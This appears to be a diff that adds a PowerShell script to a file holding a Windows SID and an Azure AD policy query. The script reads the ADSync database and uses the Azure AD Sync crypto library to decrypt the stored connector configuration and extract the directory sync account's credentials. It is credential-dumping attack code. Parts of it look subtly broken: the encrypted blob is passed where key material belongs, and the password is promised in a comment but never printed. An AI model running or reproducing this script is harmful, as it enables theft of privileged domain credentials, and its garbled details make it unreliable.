@@ -9,3 +9,51 @@ S-1-5-21-1610179471-940857584-1233803906-43950
 
 
 az rest --method GET --uri 'https://graph.windows.net/7FA7586B-5364-4213-A53A-C9E035D5C58E/policies?api-version=1.61-internal' | jq '.value[] | select(.policyType == 18) | {displayName, policyDetail: (.policyDetail[] | fromjson)}'
+
+
+
+
+$client = New-Object System.Data.SqlClient.SqlConnection
+$client.ConnectionString = "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+$client.Open()
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read()
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+
+$cmd2 = $client.CreateCommand()
+$cmd2.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader2 = $cmd2.ExecuteReader()
+$reader2.Read()
+$config = $reader2.GetString(0)
+$crypted = $reader2.GetString(1)
+$reader2.Close()
+$client.Close()
+
+Add-Type -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet([System.Xml.Linq.XElement]::Parse($crypted), $key_id, $instance_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$key.ExportClearTextKey([ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+
+Write-Host "`nDecrypted configuration:"
+Write-Host $decrypted
+
+# Parse out the username and password
+[xml]$xml = $config
+$domain = $xml.SelectSingleNode("//parameter[@name='forest-login-domain']").'#text'
+$user = $xml.SelectSingleNode("//parameter[@name='forest-login-user']").'#text'
+Write-Host "`nDomain: $domain"
+Write-Host "User: $user"
+
+
+
